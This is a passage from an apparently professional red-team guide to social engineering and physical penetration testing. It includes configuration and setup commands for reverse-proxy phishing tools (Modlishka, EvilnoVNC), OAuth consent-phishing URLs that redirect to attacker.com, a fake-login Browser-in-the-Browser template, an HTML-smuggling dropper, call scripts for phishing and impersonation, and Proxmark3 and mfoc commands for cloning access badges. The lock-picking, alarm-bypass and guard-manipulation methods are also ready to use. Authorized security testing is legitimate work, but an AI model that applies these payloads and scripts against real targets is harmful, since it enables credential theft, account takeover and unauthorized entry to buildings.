  │                            │ ─────────────────────────▶ │
  │ 3. Real login page         │                            │
  │ ◀───────────────────────── │ ◀───────────────────────── │
  │                            │                            │
  │ 4. Enters credentials      │                            │
  │ ─────────────────────────▶ │ 5. Forwards credentials    │
  │                            │ ─────────────────────────▶ │
  │                            │                            │
  │ 6. MFA prompt              │                            │
  │ ◀───────────────────────── │ ◀───────────────────────── │
  │                            │                            │
  │ 7. Completes MFA           │                            │
  │ ─────────────────────────▶ │ 8. Forwards MFA response   │
  │                            │ ─────────────────────────▶ │
  │                            │                            │
  │                            │ 9. Receives session token  │
  │                            │ ◀───────────────────────── │
  │                            │                            │
  │ 10. Redirect to Office     │ ★ Captures: username,      │
  │ ◀───────────────────────── │   password, session cookies │
  │                            │                            │
```

#### 4.1.2 Modlishka

```bash
# Modlishka — reverse proxy phishing
git clone https://github.com/drk1wi/Modlishka.git
cd Modlishka && make

# Configuration
cat > config.json << 'EOF'
{
    "proxyDomain": "phish-domain.com",
    "listeningAddress": "0.0.0.0",
    "target": "login.microsoftonline.com",
    "targetResources": "*.microsoftonline.com,*.microsoft.com,*.office.com",
    "terminateTriggers": "https://office.com",
    "terminateRedirectUrl": "https://office.com",
    "trackingCookie": "id",
    "trackingParam": "id",
    "jsRules": "",
    "forceHTTPS": true,
    "dynamicMode": true,
    "debug": false,
    "logPostOnly": false,
    "credParams": "login,passwd"
}
EOF

./proxy -config config.json
```

#### 4.1.3 EvilnoVNC

EvilnoVNC takes a different approach: instead of proxying HTTP, it runs a real browser on the attacker's server and streams the visual output to the victim via noVNC (browser-based VNC). The victim interacts with a real browser session that the attacker controls.

```bash
# EvilnoVNC setup
git clone https://github.com/JoelGMSec/EvilnoVNC.git
cd EvilnoVNC
docker-compose up -d

# The victim sees a real browser rendering the real login page
# All interaction is proxied through the attacker's browser instance
# Session tokens, cookies, and MFA responses are captured in the
# attacker-controlled browser
```

**Advantage:** Because the victim interacts with a real browser rendering real pages, there are no URL or content discrepancies for security tools to detect. The only indicator is the unusual VNC-over-WebSocket connection.

### 4.2 OAuth Consent Phishing

OAuth consent phishing tricks users into granting malicious applications access to their data through legitimate OAuth flows. No credentials are captured — the attacker obtains an OAuth token with broad permissions.

**Azure / Microsoft 365 consent grant attack:**

```
Attack Flow:
1. Register malicious Azure AD application with dangerous permissions:
   - Mail.Read, Mail.ReadWrite
   - Files.ReadWrite.All
   - User.Read.All
   - Directory.Read.All

2. Craft OAuth authorization URL:
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     client_id=MALICIOUS_APP_ID&
     response_type=code&
     redirect_uri=https://attacker.com/callback&
     scope=openid+profile+Mail.Read+Files.ReadWrite.All&
     state=random_state

3. Send link to target via phishing email:
   "TargetCorp IT: New productivity tool requires your authorization"

4. Target clicks → sees legitimate Microsoft consent screen
   → grants permissions → attacker receives OAuth token

5. Attacker uses token to read email, access files, enumerate
   directory without ever having the user's password
```

**Google Workspace consent grant:**

```
OAuth URL construction:
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=MALICIOUS_CLIENT_ID&
  redirect_uri=https://attacker.com/callback&
  scope=https://www.googleapis.com/auth/gmail.readonly+
        https://www.googleapis.com/auth/drive&
  response_type=code&
  access_type=offline&
  prompt=consent
```

### 4.3 Browser-in-the-Browser (BitB) Attacks

BitB attacks create a fake browser pop-up window within the current page, simulating an OAuth/SSO login dialog. The victim believes they're interacting with a legitimate pop-up from Google, Microsoft, or Apple.

```html
<!-- BitB template — fake Google SSO popup -->
<div id="bitb-window" style="
    position: fixed; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    width: 450px; background: #fff;
    border-radius: 8px;
    box-shadow: 0 24px 54px rgba(0,0,0,0.15),
                0 4px 16px rgba(0,0,0,0.12);
    z-index: 999999; font-family: 'Google Sans', sans-serif;">

    <!-- Fake title bar with URL display -->
    <div style="background: #dee1e6; border-radius: 8px 8px 0 0;
                padding: 6px 12px; display: flex; align-items: center;">
        <div style="display: flex; gap: 6px;">
            <span style="width:12px; height:12px; border-radius:50%;
                         background:#ff5f57;"></span>
            <span style="width:12px; height:12px; border-radius:50%;
                         background:#ffbd2e;"></span>
            <span style="width:12px; height:12px; border-radius:50%;
                         background:#28c940;"></span>
        </div>
        <div style="flex:1; margin:0 40px; background:#fff;
                    border-radius:20px; padding:4px 12px;
                    font-size:13px; color:#333; text-align:center;">
            🔒 accounts.google.com
        </div>
    </div>

    <!-- Embedded credential capture form (iframe or inline) -->
    <iframe src="https://phish-domain.com/google-login-clone"
            style="width:100%; height:500px; border:none;">
    </iframe>
</div>
```

**Detection evasion:** The BitB popup renders inside the parent page, so the URL bar showing "accounts.google.com" is just HTML text, not a real browser chrome element. Users cannot right-click → inspect the URL, drag the window outside the browser viewport, or resize it independently — these are detection indicators.

### 4.4 HTML Smuggling

HTML smuggling delivers malicious payloads by constructing them client-side from JavaScript, bypassing email gateway scanning that inspects attachments.

```html
<!-- HTML smuggling — payload assembled in-browser -->
<html>
<body>
<p>Please wait while your document loads...</p>
<script>
// Base64-encoded payload (e.g., ISO/IMG containing malicious LNK)
var payload_b64 = "UEsDBBQAAAAIAA..."; // truncated

// Decode and construct blob
var binary = atob(payload_b64);
var bytes = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
}

// Create download
var blob = new Blob([bytes], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'Q3_Report.iso';
document.body.appendChild(a);
a.click();
URL.revokeObjectURL(url);
</script>
</body>
</html>
```

**Why it works:** Email security gateways scan attachments for known malicious signatures. HTML smuggling delivers an HTML file containing JavaScript that assembles the payload after the email has passed through security controls. The gateway sees only HTML/JavaScript — the actual malicious file is constructed in the victim's browser.

### 4.5 Callback Phishing (BazarCall Technique)

Callback phishing sends an email containing no links or attachments — only a phone number. The email typically claims a subscription charge or service activation, prompting the victim to call to "cancel." The attacker's call center then guides the victim through installing remote access tools.

```
Email content (no links, no attachments — evades all URL/attachment scanning):

Subject: Confirmation of Premium Plan Activation — Invoice #INV-2025-847291

Dear [FirstName],

Your upgrade to the Premium Business Plan ($349.99/year) has been
processed. Your payment method ending in **** will be charged within
24 hours.

If you did not authorize this upgrade, please call our support team
immediately at +1 (XXX) XXX-XXXX to cancel before the charge is processed.

Reference: INV-2025-847291
```

**Call handling script:**

1. Answer professionally with the spoofed company name
2. "Verify" the caller by asking for name and email (information you already have from OSINT)
3. Express concern, offer to cancel the charge immediately
4. "To process the cancellation, I need to verify your account on our secure portal"
5. Guide victim to a URL that downloads remote access software (AnyDesk, TeamViewer, etc.)
6. Once remote access is established — objective achieved

### 4.6 Deepfake Audio for Vishing

Voice cloning technology has matured to the point where convincing deepfake audio can be generated from minutes of sample audio. This creates significant risk for voice-based social engineering.

**Attack scenario:** An attacker obtains audio samples of a CEO from earnings calls, conference presentations, podcast appearances, or social media videos. Using voice cloning services, they generate synthetic speech instructing the CFO to execute an urgent wire transfer.

**Indicators of deepfake audio:**

- Unnatural cadence or rhythm, especially during long sentences
- Lack of natural disfluencies (um, uh, pauses)
- Inconsistent background noise
- Robotic quality during emotional or stressed speech
- Refusal to go off-script or respond to unexpected questions naturally

**Defensive measures against deepfake vishing:**

- Implement verbal code words or challenge-response for high-value transactions
- Require video confirmation for transfers above threshold
- Callback verification to a known number (not one provided by the caller)
- Train executives to announce a duress code if under coercion

---

## 5. Pretexting and Impersonation

Pretexting is the foundation skill of social engineering. A pretext is a fabricated scenario that provides context and justification for the attacker's requests. Unlike phishing, which typically involves a single interaction, pretexting often involves sustained impersonation across multiple interactions.

### 5.1 Pretext Development Methodology

**The CARVE framework for pretext development:**

| Element | Description | Example |
|---|---|---|
| **C**ontext | Situational backdrop | "We're migrating to a new VPN provider this week" |
| **A**uthority | Why you have standing to make requests | "I'm the project lead for the migration" |
| **R**ationale | Why the request is necessary | "We need to verify your current config before cutover" |
| **V**erification | Something that supports your claim | Internal project name, ticket number, manager's name |
| **E**xit | How you'll end the interaction naturally | "Thanks, we'll push the new config to your device tonight" |

**Pretext testing checklist:**

- Does this pretext survive a 30-second verification attempt? (target calls the department you claim to be from)
- Is there a reasonable explanation if the target says "my manager didn't mention this"?
- Can you handle a transfer to someone else without breaking cover?
- Do the details you claim match observable reality? (you claim to be on the 3rd floor — does the building have 3 floors?)
- Is the requested action proportional to the urgency you're claiming?

### 5.2 Common Pretext Scenarios

#### 5.2.1 IT Support Pretext

The most versatile pretext for both phone and in-person social engineering.

```
Scenario: "IT is pushing a critical security patch"

Setup:
- OSINT: Identify the company's ticketing system (ServiceNow, Jira Service
  Management, Zendesk) from job postings or employee mentions
- OSINT: Identify the IT director's name from LinkedIn
- OSINT: Identify the endpoint management tool (SCCM, Intune, Jamf)

Call script:
"Hi [Name], this is [FakeName] from IT. We're pushing a critical patch
today — [IT Director's name] sent out an email about it this morning.
We're using [endpoint tool] to deploy, but your machine didn't check in.
I need to verify your machine name so I can push it manually. Can you
open a command prompt and type 'hostname' for me?"

Escalation (if successful):
"Great, I see it now. The patch requires a reboot, but first I need to
verify your network configuration. Can you run 'ipconfig /all' and read
me the DNS server entries?"
```

#### 5.2.2 Vendor Pretext

```
Scenario: Impersonating a known vendor's support

Setup:
- OSINT: Identify vendors from job postings, press releases, case studies
- Research the vendor's actual support processes and terminology
- Obtain vendor's support phone number format for caller ID spoofing

"Hi, this is [Name] from [Vendor] support. We're seeing some anomalies
with your [product] instance — ticket number [fabricated]. Your admin
[Real Admin Name] opened a ticket last week about [plausible issue].
I need to verify your configuration to proceed with the fix."
```

#### 5.2.3 New Employee Pretext

Highly effective for physical access because new employees are expected to be unfamiliar with procedures.

```
Physical entry:
- Dress appropriately for the target organization's culture
- Carry a laptop bag and appear slightly lost
- Approach reception: "Hi, I'm [Name], I just started in [Department]
  this week. [Manager Name] told me to come in today but I don't have
  my badge yet — can someone let me up to the [Nth] floor?"

Why it works:
- New employees are expected to not have badges
- Staff feel sympathetic and want to help
- Claiming a specific department and manager name adds credibility
- The scenario is completely normal and non-threatening
```

#### 5.2.4 Executive Pretext

Leverages authority principle. Most effective via email (BEC) or phone.

```
"This is [Executive Name]'s office. [He/She] needs the Q3 financial
summary sent to [attacker email] within the hour for a board presentation.
[He/She] is on a flight and can't access the VPN. Can you pull that
report and send it over?"

Key elements:
- Use executive assistant framing to explain why the exec isn't calling directly
- Time pressure (within the hour, board meeting, flight)
- Knowledge of real upcoming events (from company calendar, press releases)
- Plausible reason for unusual channel (can't access VPN, phone dying)
```

#### 5.2.5 Auditor / Compliance Pretext

```
"I'm [Name] with [Audit Firm]. We're conducting the [SOC2/PCI/ISO 27001]
assessment — your compliance team should have sent you a calendar invite
last week. I need to verify a few controls with you. Can you confirm
how your department handles [specific process]?"
```

#### 5.2.6 Delivery Pretext

For physical access. Delivery personnel are rarely challenged.

```
Physical entry:
- Uniform: generic polo shirt with clipboard/tablet, hi-vis vest optional
- Carry a box (preferably with a shipping label addressed to someone in
  the building — printable from OSINT)
- "Hi, I have a delivery for [Real Employee Name], [Real Department].
  Can you sign for it? Actually, [he/she] requested it be brought up
  directly — can someone badge me up?"
```

### 5.3 Handling Resistance and Suspicion

When a target pushes back, amateur social engineers panic. Professional operators have rehearsed responses:

| Resistance | Response |
|---|---|
| "I need to verify this with my manager" | "Absolutely, please do. [Manager's name], right? I spoke with [him/her] earlier today about this. My callback number is [spoofed number]" |
| "Can you send me an email about this?" | "Of course. What's your email? I'll send it from the [department] shared mailbox right now." (Then actually send a prepared email) |
| "I'm not comfortable sharing that" | "I completely understand. Let me escalate this to [fabricated supervisor] and have them reach out to you directly." (Retreat gracefully, attempt different target) |
| "This doesn't seem right" | "You're smart to be cautious — that's exactly what [IT Director] said you should do. Let me give you the ticket number so you can verify: [fabricated ticket]" |
| "I've never seen this process before" | "It's new — [Company] rolled it out last month as part of the [plausible initiative]. I know it's different from the old way." |

**Critical rule:** Never argue with a suspicious target. Validate their suspicion, provide a verification path you control, or gracefully exit. Arguing increases suspicion and risks the entire engagement.

### 5.4 Voice Modulation and Language Adaptation

- Match the target's energy level and formality
- Use the organization's internal terminology (discovered during OSINT)
- Adopt the speech patterns of the role you're impersonating (IT speaks differently than HR, which speaks differently than legal)
- Control pacing — rushed speech signals nervousness; deliberate pacing signals confidence
- Use the target's name early and periodically — creates familiarity and rapport
- Mirror the target's language (if they say "laptop," don't say "workstation")

---

## 6. Physical Security Testing

Physical penetration testing assesses an organization's ability to prevent unauthorized physical access to facilities, equipment, and sensitive areas.

### 6.1 Physical Penetration Testing Scope and Rules

**Scope document must specify:**

- Which buildings/floors/rooms are in scope
- Hours of testing (business hours only? after-hours? weekends?)
- Authorized techniques (tailgating, lock picking, badge cloning, dumpster diving)
- Off-limits areas (data centers with live production, executive offices without specific authorization)
- Employee interaction boundaries (can you pretext employees? which departments?)
- Law enforcement contact plan (what happens if police are called?)
- "Get out of jail free" letter — signed by authorizing officer, with 24/7 contact number

**The authorization letter must include:**

```
AUTHORIZATION FOR PHYSICAL SECURITY ASSESSMENT

Date: [DATE]
Authorization Period: [START] to [END]

[Company Name] hereby authorizes [Testing Firm/Individual] to
conduct physical security testing at the following locations:
  - [Address 1] — All areas except [exclusions]
  - [Address 2] — Floors [X] through [Y]

Authorized techniques: [enumerated list]

Bearer: [Tester Name] — [Physical description / photo]

This authorization was issued by:
[Name], [Title]
[Direct phone number — available 24/7 during assessment period]
[Signature]

If you encounter this individual, please call [phone] to verify
before taking any action.
```

### 6.2 Reconnaissance

#### 6.2.1 Perimeter Assessment

```
Physical recon checklist:
□ Fence type, height, condition, sensor presence
□ Gate types (swing, slide, barrier) — automated or manual?
□ Camera locations, types (dome/bullet/PTZ), coverage gaps
□ Lighting coverage — dark spots, timer-controlled vs. dusk-to-dawn
□ Guard presence — hours, patrol routes (observe multiple days)
□ Vehicle barriers (bollards, planters, jersey barriers)
□ Signage indicating security measures (alarm company, surveillance warnings)
□ Adjacent properties — shared walls, accessible rooftops, parking structures
□ Landscaping that provides concealment or climbing access
□ Drainage, utility access points, loading docks
```

#### 6.2.2 Entry Point Mapping

```
Entry point assessment matrix:

| Entry Point       | Type     | Control       | Hours    | Traffic | Notes           |
|-------------------|----------|---------------|----------|---------|-----------------|
| Main lobby        | Door     | Badge + guard | 7a-7p    | High    | Mantrap present |
| Side entrance     | Door     | Badge only    | 24/7     | Medium  | Smokers prop it |
| Loading dock      | Roll-up  | Intercom      | 8a-5p    | Low     | No camera       |
| Parking garage    | Gate     | Badge         | 24/7     | High    | Tailgate-able   |
| Emergency exits   | Door     | Alarm bar     | N/A      | None    | Alarmed         |
| Roof access       | Hatch    | Keyed lock    | N/A      | None    | From stairwell  |
```

#### 6.2.3 Employee Behavior Observation

Observe for 2-5 days across different times:

- Badge swiping discipline — do employees swipe individually or hold doors?
- Smoking area locations — propped doors, social interactions with strangers
- Lunch hour patterns — which entrances are used? Is the lobby crowded?
- Delivery patterns — when do deliveries arrive? How are drivers handled?
- Visitor procedures — how thoroughly are visitors screened and escorted?
- After-hours patterns — who works late? Do they challenge strangers?
- Badge visibility — worn on lanyard, belt clip, or pocket? Color-coded by access level?

### 6.3 Tailgating and Piggybacking

**Tailgating:** Following an authorized person through a secured door without their knowledge or active cooperation.

**Piggybacking:** Following with the authorized person's knowledge and tacit or explicit permission ("they held the door for me").

**Techniques:**

- **Hands-full approach:** Carry boxes, coffee cups, a laptop bag — people instinctively hold doors for someone whose hands are full
- **Phone conversation:** Appear to be on an important call while walking toward the door — the badged employee hesitates to interrupt
- **Group timing:** Wait for a group entering after a meeting break and blend in
- **Confidence walk:** Walk directly behind a badge swiper with purpose and authority; hesitation triggers suspicion
- **Smoker's door:** Identify propped emergency exits near smoking areas

**Countermeasures assessment:**

- Are mantraps (anti-tailgating vestibules) present at critical entry points?
- Do turnstiles or optical barriers enforce single-person entry?
- Are employees trained and empowered to challenge tailgaters?
- Are there cameras specifically positioned to detect multi-person badge swipes?
- Is there a badge-count vs. occupancy reconciliation system?

### 6.4 Lock Picking

Lock picking bypasses mechanical locks without destructive entry. For physical penetration testing, this is a core skill.

#### 6.4.1 Pin Tumbler Locks

The most common lock type in commercial environments.

```
Pin tumbler mechanism:

    Driver pins (spring-loaded)
    │ │ │ │ │
    ▼ ▼ ▼ ▼ ▼
   ┌─┬─┬─┬─┬─┐
   │●│●│●│●│●│  ← Driver pins (must align at shear line)
   ├─┼─┼─┼─┼─┤  ← Shear line (plug/shell boundary)
   │○│○│○│○│○│  ← Key pins (varied lengths matching key cuts)
   ├─┤ ├─┤ ├─┤
   │         │
   │  Plug   │  ← Rotates when all pins align at shear line
   │         │
   └─────────┘

Picking technique:
1. Insert tension wrench — apply light rotational pressure
2. Insert pick — feel for binding pin (the one resisting movement)
3. Push binding pin to shear line — feel/hear slight click
4. Pin is set — next pin now binds
5. Repeat for all pins
6. Plug rotates — lock opens
```

**Pick types and applications:**

| Pick | Use Case |
|---|---|
| Hook pick | Standard pin-by-pin picking, most versatile |
| Diamond pick | Wafer locks, quick work on low-security pin tumblers |
| Rake (snake/city) | Rapid entry, uses randomized raking motion |
| Bogota rake | Fast raking for standard pin tumblers |
| Half-diamond | Wafer locks, some pin tumblers |
| Tension wrench (TOK) | Top-of-keyway tension — preferred for most picking |
| Tension wrench (BOK) | Bottom-of-keyway — easier for beginners but blocks pick movement |

#### 6.4.2 Wafer Locks

Common in filing cabinets, desk drawers, and low-security commercial furniture.

```
Wafer mechanism (single-sided):
- Flat wafers instead of cylindrical pins
- Spring-loaded into slots in the plug
- Much simpler than pin tumblers
- Often defeated with a single rake pass or jiggle key
```

#### 6.4.3 Disc Detainer Locks

Higher-security mechanism used in padlocks (Abloy, Abus, Kryptonite).

```
Disc detainer mechanism:
- Stack of rotating discs instead of spring pins
- Each disc has a slot that must align with a sidebar
- Requires specialized disc detainer picks (not standard hook picks)
- Significantly harder to pick — but not impossible

# Disc detainer pick tools:
# - Sparrows Disc Detainer Pick
# - Bosnian Bill's disc detainer tools
# - DIY picks from key blanks
```

#### 6.4.4 Bypass Tools

Many locks can be bypassed without picking the mechanism:

- **Shims:** Thin metal strips inserted between the shackle and locking mechanism of padlocks
- **Comb picks:** Lift all pins simultaneously above the shear line
- **Bypass drivers:** Insert through the back of certain lock bodies to directly actuate the tailpiece
- **Under-door tools:** Reach under commercial doors to actuate interior lever handles
- **Traveler hooks:** Reach through mail slots or gaps to turn interior deadbolts

### 6.5 Badge Cloning

#### 6.5.1 RFID / HID ProxCard Cloning

Most commercial access control uses RFID proximity cards. Low-frequency (125 kHz) cards like HID ProxCard II transmit credentials unencrypted and are trivially cloned.

```bash
# Proxmark3 — the standard tool for RFID security research
# Read a low-frequency (125 kHz) HID ProxCard
proxmark3> lf search
# Output:
# [+] HID Prox TAG ID: 2004263f88 (6025) - Format Len: 26bit
# [+] Facility Code: 118 Card Number: 3012

# Clone to a T5577 writable card
proxmark3> lf hid clone --r 2004263f88

# Read a high-frequency (13.56 MHz) MIFARE Classic card
proxmark3> hf search
# [+] MIFARE Classic 1k card detected
# UID: AB CD EF 12

# Dump MIFARE Classic keys and data
proxmark3> hf mf autopwn
# Runs nested/hardnested/darkside attacks to recover sector keys
# Then dumps all sectors to file

# Clone MIFARE Classic UID (for systems that only check UID)
proxmark3> hf mf csetuid --uid ABCDEF12
```

#### 6.5.2 Flipper Zero for Badge Cloning

```bash
# Flipper Zero — portable multi-tool for physical security testing
# Read 125 kHz card
# [RFID 125kHz] → Read → Hold card to Flipper
# Displays: Protocol, Facility Code, Card Number

# Emulate captured card
# [RFID 125kHz] → Saved → Select card → Emulate
# Hold Flipper to card reader

# Read 13.56 MHz card
# [NFC] → Read → Hold card to Flipper
# For MIFARE Classic: attempts dictionary attack on sector keys

# Flipper Zero limitations:
# - Cannot crack MIFARE DESFire or EV2/EV3 (encrypted comms)
# - Limited MIFARE Classic key cracking compared to Proxmark3
# - 125 kHz cloning works for HID ProxCard, EM4100, Indala
# - Cannot emulate HID iCLASS SE or SEOS (encrypted)
```

#### 6.5.3 Long-Range Badge Reading

```
Weaponized RFID readers:
- Standard HID readers have ~5 cm read range
- Modified readers with amplified antennas can read 125 kHz cards at 50+ cm
- Concealed in a backpack, briefcase, or carried as a clipboard-mounted reader
- Walk past target in elevator, hallway, cafeteria — read card through clothing/wallet
- Requires line-of-sight to the card and minimal metallic interference

Countermeasures:
- RFID-blocking wallets/sleeves (work for 13.56 MHz, limited for 125 kHz)
- Transition to encrypted protocols (iCLASS SE, SEOS, DESFire EV2/EV3)
- Multi-factor physical access (card + PIN, card + biometric)
```

### 6.6 Alarm System Assessment

```
Alarm system bypass techniques (authorized testing only):

1. PIR (Passive Infrared) motion sensors:
   - Detect body heat in motion
   - Bypass: move extremely slowly (<0.1 m/s), stay behind glass/plexiglass,
     or use a reflective thermal blanket (Mylar)
   - Limitation: modern PIR sensors have anti-masking and dual-tech (PIR+MW)

2. Door/window contact sensors:
   - Magnetic reed switches detect separation
   - Bypass: place a secondary magnet to hold the reed closed while opening
     the door/window
   - Limitation: balanced magnetic sensors resist secondary magnet attacks

3. Glass break sensors:
   - Detect specific frequency/amplitude of breaking glass
   - Bypass: cut glass silently (not practical for most scenarios),
     or enter through a different opening

4. Alarm panel:
   - Default codes (1234, 0000, year of installation)
   - Social engineer the alarm code from employees
   - Physical access to panel may allow hard reset (documented in vendor manuals)
```

### 6.7 Dumpster Diving

Dumpster diving retrieves intelligence from discarded materials. Despite being one of the oldest attack vectors, it remains effective because most organizations have incomplete document destruction policies.

**Valuable finds:**

- Printed emails with internal project details
- Network diagrams, IP address lists
- Employee directories and org charts
- Post-it notes with passwords (especially from desk cleanouts)
- Financial documents, contracts, proposals
- Discarded hard drives, USB devices, mobile phones
- Visitor logs, meeting agendas, calendar printouts
- Building access codes on discarded entry slips
- Old employee badges (cloning source)

**Methodology:**

1. Identify dumpster location and pickup schedule (observe or check municipal records)
2. Time your dive for the night before pickup (maximum material, minimum time in dumpster)
3. Bring: gloves, flashlight, bags for collection, hand sanitizer
4. Photograph items in situ before removing them (establishes provenance)
5. Sort on-site if time permits, otherwise bag and sort at a secure location
6. Catalog and photograph all findings
7. Handle all collected materials as evidence — chain of custody applies

---

## 7. Physical Access Techniques

### 7.1 Lock Bypass Methods

Beyond traditional picking, several bypass techniques provide faster entry:

#### 7.1.1 Bump Keys

```
Bump key technique:
- A bump key is cut to the maximum depth on all positions for a given keyway
- Insert bump key one pin short of full insertion
- Apply light tension
- Strike the bow of the key with a bump hammer or hard object
- Kinetic energy transfers through key pins to driver pins
- Driver pins jump above the shear line momentarily
- Tension wrench (or applied tension to the bump key) rotates the plug

Effectiveness:
- Works on ~90% of standard pin tumbler locks
- Defeated by security pins (spools, serrated, mushroom)
- Detectable by forensic examination (microscopic marks on pins)
- Increasingly defended against by high-security residential locks

Creating bump keys:
- Purchase blank key for the target keyway
- Cut all positions to maximum depth using a key machine
- Lightly file the tip for smooth insertion
```

#### 7.1.2 Pick Guns (Snap Guns)

```
Pick gun operation:
- Electric or manual snap gun
- Insert tension wrench and pick gun needle into lock
- Trigger fires the needle upward against the bottom pins
- Energy transfer launches driver pins above shear line
- Apply tension to catch the plug rotation

Types:
- Manual snap gun — requires practice, less suspicious to carry
- Electric pick gun — more consistent, looks like a power tool
- Both legal to own in most US states (check local laws)
- Effectiveness similar to bumping: high on standard pins, lower on security pins
```

#### 7.1.3 Commercial-Grade Picks and Tools

```
Professional lock bypass toolkit:

Essential picks:
- Peterson hooks (0.018" and 0.025" thickness)
- Sparrows Monstrum XXL set (covers most pin tumbler keyways)
- TOK tension wrenches (multiple widths)
- Peterson Gem and Hook 1 (workhorses for SPP)

Bypass tools:
- Lishi 2-in-1 picks (decode and pick simultaneously) — vehicle and commercial
- Under-door tool (Assa Abloy bypass for commercial lever handles)
- Adams Rite bypass tool (storefront glass door latches)
- American Lock bypass tool (padlock series 1100/5200)
- Hinge removal tool (hinge pins on outswing doors)
- Loider tool (latch slipping with flexible ribbon)
```

### 7.2 Electronic Lock Attacks

#### 7.2.1 Keypad Locks

```
Keypad attack techniques:

1. Shoulder surfing:
   - Observe PIN entry from a distance or elevation
   - Camera with zoom (telephoto from parking lot, drone with camera)
   - Thermal imaging: residual heat on pressed buttons visible for 30-60 seconds
     after entry (FLIR camera or FLIR smartphone attachment)

2. Wear pattern analysis:
   - Frequently pressed buttons show wear (oil residue, paint wear, shine)
   - Limits the keyspace from 10^N to combinations of worn buttons
   - UV light reveals latent oil deposits on keypads

3. Brute force:
   - Standard 4-digit PIN: 10,000 combinations
   - If 4 buttons show wear: 4^4 = 256 combinations (or 4! * k permutations)
   - Many keypads have no lockout — try all combinations methodically
   - Some keypads accept rolling entry (1234 → test 1234, 2345, 3456 in stream)

4. Default codes:
   - Many commercial keypad locks ship with default codes
   - Check vendor documentation (often publicly available)
   - Common defaults: 1234, 0000, manufacturer-specific
```

#### 7.2.2 Relay Attacks

```
Relay attack against keyless entry / NFC locks:

Attacker A (near victim's card)    Attacker B (near target door)
         │                                    │
         │  Relay device (smartphone          │  Relay device
         │  with NFC + cellular/BT)           │  emulating card
         │                                    │
    ┌────┴────┐                          ┌────┴────┐
    │ Reads   │ ◀── relay channel ──▶    │ Replays │
    │ card    │   (real-time forward)    │ to lock │
    └─────────┘                          └─────────┘

Tool: NFCGate (Android app for NFC relay attacks)
- Requires two rooted Android devices
- One reads the card, relays data over network
- Second emulates the card to the reader
- Effective range: unlimited (Internet relay)
- Defeated by: distance bounding protocols, challenge-response timing
```

### 7.3 RFID/NFC Cloning — Detailed Tool Usage

#### 7.3.1 Proxmark3 Advanced Operations

```bash
# Proxmark3 RDV4 — advanced RFID operations

# === Low Frequency (125 kHz) ===

# Sniff LF communications
proxmark3> lf sniff
# Captures raw LF data for offline analysis

# Brute-force facility codes (if card number known)
proxmark3> lf hid brute --fc 0 --cn 3012
# Iterates facility codes 0-255 with known card number

# Simulate HID card without writing to physical card
proxmark3> lf hid sim --r 2004263f88
# Useful for testing access without leaving a cloned card behind

# === High Frequency (13.56 MHz) ===

# MIFARE Classic nested attack (requires one known key)
proxmark3> hf mf nested --1k -b 0 -k FFFFFFFFFFFF --tblk 4 --ta
# Exploits mathematical weakness in MIFARE Classic PRNG

# MIFARE Classic hardnested attack (no known keys required)
proxmark3> hf mf hardnested --1k -b 0 -k FFFFFFFFFFFF --tblk 4 --ta
# Works on fixed-nonce (hardened) MIFARE Classic cards

# Darkside attack (works on original MIFARE Classic only)
proxmark3> hf mf darkside
# Exploits PRNG weakness in first-generation cards

# Write cloned data to Magic MIFARE card (UID changeable)
proxmark3> hf mf csetuid --uid AABBCCDD
proxmark3> hf mf cload -f dump_file.bin

# === iCLASS ===
# Read iCLASS legacy card (vulnerable to Loclass attack)
proxmark3> hf iclass reader
proxmark3> hf iclass loclass
# Recovers keys from legacy iCLASS cards
# Does NOT work on iCLASS SE or SEOS (uses HID's cloud-based key management)
```

#### 7.3.2 ACR122U NFC Reader

```bash
# ACR122U — USB NFC reader for 13.56 MHz cards
# Used with libnfc and mfoc/mfcuk tools

# Install dependencies
apt install libnfc-bin mfoc

# Read card UID
nfc-list
# Output: ISO14443A passive target detected: UID=AABBCCDD

# Dump MIFARE Classic (requires at least one default key)
mfoc -O card_dump.mfd
# Tries default keys, then uses nested attack for remaining sectors

# If no default keys work, use mfcuk (darkside attack)
mfcuk -C -R 0:A -v 3 -s 250
# Recovers first key, then mfoc can derive the rest

# Write dump to Magic MIFARE card
nfc-mfclassic w A card_dump.mfd blank_card.mfd
```

### 7.4 Social Engineering for Physical Access

#### 7.4.1 Delivery Pretext — Detailed Execution

```
Preparation:
1. Order a real package to a real employee at the target address
   (use Amazon, send something small/cheap)
2. Intercept the package at delivery or request pickup at carrier facility
3. Now you have a real package with real tracking, addressed to a real person

Execution:
1. Arrive at building dressed as courier (polo, dark pants, clipboard)
2. "Hi, I have a package for [Real Name], [Real Department]. It's marked
   fragile and signature-required — I need to deliver it directly."
3. If challenged: show the real tracking number on your phone
4. Once badged in or escorted, note security controls, camera locations,
   access procedures for the report
5. Deliver the package, thank the escort, leave

Evidence collection while inside:
- Photograph badge readers, camera types, lock hardware (discreetly)
- Note which doors are propped open
- Note whether anyone challenges or escorts you
- Note whether your visit is logged
- Time how long you're unescorted
```

#### 7.4.2 Interview Pretext

```
Preparation:
1. Apply for a real job at the target company (or arrange through the
   authorizing contact to have a fake interview scheduled)
2. OSINT the hiring manager and team

Execution:
1. Arrive early for the "interview"
2. You'll be issued a visitor badge and potentially escorted
3. Note the visitor management system, badge type, escort procedures
4. Ask for a "restroom break" or "water" — test whether you're left
   unescorted
5. Note access controls between visitor areas and employee areas
6. Observe badge reader types, camera coverage, door hardware

Post-visit:
- Assess whether visitor badge provides any physical access beyond the lobby
- Assess escort discipline
- Document all observations for the physical security report
```

### 7.5 After-Hours Access

#### 7.5.1 Guard Manipulation

```
Social engineering security guards:

Reconnaissance:
- Identify guard company (uniforms, vehicle markings)
- Determine guard schedules (observe shift changes)
- Determine guard authority level (do they verify credentials or just wave?)

Pretexts:
- "I left my laptop and I have a deadline tomorrow morning. My badge isn't
   working — can you let me in?" (authority + urgency + sympathy)
- "[Manager name] asked me to check the server room — we're having an
   outage." (authority + crisis)
- "[Show a fabricated work order] I'm with [HVAC/elevator/fire suppression
   company] — we have an emergency service call for unit [number]."

Key insight:
- Contract security guards are often undertrained and underpaid
- Their employer evaluates them on customer service, not security rigor
- They're more afraid of inconveniencing a legitimate employee than
  admitting an unauthorized person
- After-hours guards are often alone and lack peer verification
```

---

## 8. Red Team Social Engineering Operations

### 8.1 Planning SE Campaigns

#### 8.1.1 Objectives

